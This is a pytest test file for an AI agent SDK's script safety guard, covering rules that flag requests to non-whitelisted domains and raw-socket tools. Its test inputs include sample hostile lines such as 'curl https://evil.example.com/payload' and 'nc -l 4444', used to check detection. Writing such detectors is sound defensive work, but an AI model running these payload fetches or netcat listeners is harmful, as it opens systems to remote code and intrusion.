"""Unit tests for network rules — NET-001 and NET-002."""

import importlib

import pytest

from trpc_agent_sdk.tools.safety.guard import ScriptSafetyGuard
from trpc_agent_sdk.tools.safety.models import (
    Decision,
    Language,
    SafetyCheckInput,
    Severity,
    ToolMetadata,
)
from trpc_agent_sdk.tools.safety.policy import NetworkPolicy, PolicyConfig
from trpc_agent_sdk.tools.safety.rules._base import rule_registry
from trpc_agent_sdk.tools.safety.rules.network import (
    NetworkRequestRule,
    RawSocketRule,
    _domain_matches_whitelist,
    _extract_domain_from_python_arg,
)


@pytest.fixture(autouse=True)
def _ensure_rules_registered():
    if rule_registry.count == 0:
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.file_ops"))
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.network"))
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.process"))
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.dependency"))
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.resource"))
        importlib.reload(importlib.import_module("trpc_agent_sdk.tools.safety.rules.secrets"))


def _make_input(code: str, language: str = "python") -> SafetyCheckInput:
    return SafetyCheckInput(
        script_content=code,
        language=Language(language),
        tool_metadata=ToolMetadata(tool_name="test", invocation_id="inv-net"),
    )


# ---------------------------------------------------------------------------
# Test _domain_matches_whitelist
# ---------------------------------------------------------------------------


class TestDomainMatchesWhitelist:
    """Test the whitelist matching logic."""

    def test_exact_match(self):
        assert _domain_matches_whitelist("api.openai.com", ["api.openai.com"]) is True

    def test_glob_match(self):
        assert _domain_matches_whitelist("sub.openai.com", ["*.openai.com"]) is True

    def test_no_match(self):
        assert _domain_matches_whitelist("evil.com", ["*.openai.com", "github.com"]) is False

    def test_case_insensitive(self):
        assert _domain_matches_whitelist("API.OpenAI.COM", ["api.openai.com"]) is True

    def test_empty_whitelist(self):
        assert _domain_matches_whitelist("any.domain.com", []) is False

    def test_wildcard_all(self):
        assert _domain_matches_whitelist("anything.example.org", ["*.example.org"]) is True

    def test_glob_deeper_subdomain(self):
        assert _domain_matches_whitelist("a.b.c.example.com", ["*.example.com"]) is True


# ---------------------------------------------------------------------------
# Test _extract_domain_from_python_arg
# ---------------------------------------------------------------------------


class TestExtractDomainFromPythonArg:
    """Test domain extraction from URL arguments."""

    def test_https_url(self):
        assert _extract_domain_from_python_arg("https://api.example.com/v1") == "api.example.com"

    def test_http_url(self):
        assert _extract_domain_from_python_arg("http://data.server.io/fetch") == "data.server.io"

    def test_ftp_url(self):
        assert _extract_domain_from_python_arg("ftp://files.example.com/data") == "files.example.com"

    def test_url_with_port(self):
        assert _extract_domain_from_python_arg("http://api.example.com:8080/v1") == "api.example.com"

    def test_url_with_auth(self):
        assert _extract_domain_from_python_arg("https://user:pass@secret.io/api") == "secret.io"

    def test_non_url_returns_none(self):
        assert _extract_domain_from_python_arg("not_a_url") is None

    def test_url_no_dot_returns_none(self):
        assert _extract_domain_from_python_arg("http://localhost/api") is None

    def test_empty_returns_none(self):
        assert _extract_domain_from_python_arg("") is None

    def test_url_path_only(self):
        assert _extract_domain_from_python_arg("/api/v1/data") is None


# ---------------------------------------------------------------------------
# Test NetworkRequestRule — NET-001
# ---------------------------------------------------------------------------


class TestNetworkRequestRule:
    """Test NET-001 rule scanning."""

    def test_python_non_whitelisted_domain(self):
        """Non-whitelisted domain should produce NET-001 finding."""
        guard = ScriptSafetyGuard()
        code = "import requests\nrequests.get('https://evil.example.com/data')"
        result = guard.check(_make_input(code))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) >= 1
        assert "evil.example.com" in net_findings[0].description

    def test_python_whitelisted_domain(self):
        """Whitelisted domain should NOT produce NET-001 finding."""
        guard = ScriptSafetyGuard()
        code = "import requests\nrequests.get('https://pypi.org/simple/flask/')"
        result = guard.check(_make_input(code))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) == 0

    def test_python_dynamic_url_no_args(self):
        """Network call with no static args should produce lower confidence finding."""
        guard = ScriptSafetyGuard()
        code = "import requests\nurl = get_url()\nrequests.get(url)"
        result = guard.check(_make_input(code))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        # Should flag with lower confidence
        dynamic_findings = [f for f in net_findings if f.confidence < 1.0]
        assert len(dynamic_findings) >= 1

    def test_python_multiple_network_calls(self):
        """Multiple network calls should each produce findings."""
        guard = ScriptSafetyGuard()
        code = """import requests
requests.get('http://site-a.io/api')
requests.post('http://site-b.io/data')
"""
        result = guard.check(_make_input(code))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) >= 2

    def test_bash_curl_non_whitelisted(self):
        """Bash curl to non-whitelisted domain produces NET-001."""
        guard = ScriptSafetyGuard()
        code = "curl https://evil.example.com/payload"
        result = guard.check(_make_input(code, "bash"))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) >= 1

    def test_bash_wget_whitelisted(self):
        """Bash wget to whitelisted domain should pass."""
        guard = ScriptSafetyGuard()
        code = "wget https://pypi.org/packages/flask.tar.gz"
        result = guard.check(_make_input(code, "bash"))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) == 0

    def test_bash_comment_line_skipped(self):
        """Comments should not trigger network findings."""
        guard = ScriptSafetyGuard()
        code = "# curl https://evil.com/bad\necho 'safe'"
        result = guard.check(_make_input(code, "bash"))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) == 0

    def test_custom_whitelist_passes(self):
        """Custom policy whitelist should prevent findings."""
        policy = PolicyConfig(network=NetworkPolicy(allowed_domains=["custom.internal.io"]))
        guard = ScriptSafetyGuard(policy=policy)
        code = "import requests\nrequests.get('https://custom.internal.io/api')"
        result = guard.check(_make_input(code))
        net_findings = [f for f in result.findings if f.rule_id == "NET-001"]
        assert len(net_findings) == 0


# ---------------------------------------------------------------------------
# Test RawSocketRule — NET-002
# ---------------------------------------------------------------------------


class TestRawSocketRule:
    """Test NET-002 rule scanning."""

    def test_python_socket_creation(self):
        """socket.socket() should trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "import socket\ns = socket.socket()"
        result = guard.check(_make_input(code))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) >= 1

    def test_python_create_connection(self):
        """socket.create_connection() should trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "import socket\nconn = socket.create_connection(('host', 80))"
        result = guard.check(_make_input(code))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) >= 1

    def test_bash_nc_triggers(self):
        """nc command should trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "nc -l 4444"
        result = guard.check(_make_input(code, "bash"))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) >= 1

    def test_bash_netcat_triggers(self):
        """netcat command should trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "netcat -zv host 80"
        result = guard.check(_make_input(code, "bash"))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) >= 1

    def test_bash_telnet_triggers(self):
        """telnet command should trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "telnet server.com 23"
        result = guard.check(_make_input(code, "bash"))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) >= 1

    def test_python_no_socket_no_finding(self):
        """Code without socket usage should not trigger NET-002."""
        guard = ScriptSafetyGuard()
        code = "import json\ndata = json.dumps({'key': 'value'})"
        result = guard.check(_make_input(code))
        socket_findings = [f for f in result.findings if f.rule_id == "NET-002"]
        assert len(socket_findings) == 0
